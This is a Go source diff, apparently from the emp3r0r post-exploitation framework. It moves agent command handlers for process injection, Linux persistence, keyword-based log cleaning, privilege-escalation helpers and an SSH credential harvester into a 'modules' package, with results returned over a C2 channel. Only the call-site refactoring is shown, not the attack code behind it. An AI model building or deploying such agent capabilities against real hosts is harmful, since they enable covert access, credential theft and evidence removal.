@@ -11,6 +11,7 @@ import (
 	"strconv"
 
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/c2transport"
+	"github.com/jm33-m0/emp3r0r/core/internal/agent/modules"
 	"github.com/spf13/cobra"
 )
 
@@ -29,7 +30,7 @@ func runInjectLinux(cmd *cobra.Command, args []string) {
 		c2transport.C2RespPrintf(cmd, "%s", "Error: invalid pid")
 		return
 	}
-	err = InjectorHandler(int(pidInt), method, checksum)
+	err = modules.InjectorHandler(int(pidInt), method, checksum)
 	if err != nil {
 		c2transport.C2RespPrintf(cmd, "%s", "Error: "+err.Error())
 		return
@@ -45,7 +46,7 @@ func runPersistenceLinux(cmd *cobra.Command, _ []string) {
 		return
 	}
 	if method == "all" {
-		err := PersistAllInOne()
+		err := modules.PersistAllInOne()
 		if err != nil {
 			log.Println(err)
 			c2transport.C2RespPrintf(cmd, "%s", "Some has failed: "+err.Error())
@@ -54,7 +55,7 @@ func runPersistenceLinux(cmd *cobra.Command, _ []string) {
 		}
 		return
 	} else {
-		if persistMethod, exists := PersistMethods[method]; exists {
+		if persistMethod, exists := modules.PersistMethods[method]; exists {
 			err := persistMethod()
 			if err != nil {
 				log.Println(err)
@@ -84,7 +85,7 @@ func runCleanLogLinux(cmd *cobra.Command, args []string) {
 		c2transport.C2RespPrintf(cmd, "%s", "Error: args error")
 		return
 	}
-	err := CleanAllByKeyword(keyword)
+	err := modules.CleanAllByKeyword(keyword)
 	if err != nil {
 		c2transport.C2RespPrintf(cmd, "%s", err.Error())
 		return
@@ -100,7 +101,7 @@ func runLPELinux(cmd *cobra.Command, args []string) {
 		c2transport.C2RespPrintf(cmd, "%s", "Error: args error")
 		return
 	}
-	out := runLPEHelper(scriptName, checksum)
+	out := modules.RunLPEHelper(scriptName, checksum)
 	c2transport.C2RespPrintf(cmd, "%s", out)
 }
 
@@ -109,8 +110,8 @@ func runSSHHarvesterLinux(cmd *cobra.Command, args []string) {
 	codePattern, _ := cmd.Flags().GetString("code_pattern")
 	regName, _ := cmd.Flags().GetString("reg_name")
 	stop, _ := cmd.Flags().GetBool("stop")
-	if stop && SshHarvesterCancel != nil {
-		SshHarvesterCancel()
+	if stop && modules.SshHarvesterCancel != nil {
+		modules.SshHarvesterCancel()
 		c2transport.C2RespPrintf(cmd, "%s", "SSH harvester stopped")
 		return
 	}
@@ -119,9 +120,9 @@ func runSSHHarvesterLinux(cmd *cobra.Command, args []string) {
 		c2transport.C2RespPrintf(cmd, "%s", fmt.Sprintf("Error parsing hex string: %v", err))
 		return
 	}
-	if sshHarvesterRunning {
+	if modules.SshHarvesterRunning {
 		c2transport.C2RespPrintf(cmd, "%s", "SSH harvester is already running")
 	} else {
-		go ssh_harvester(cmd, codePatternBytes, regName)
+		go modules.SshHarvester(cmd, codePatternBytes, regName)
 	}
 }
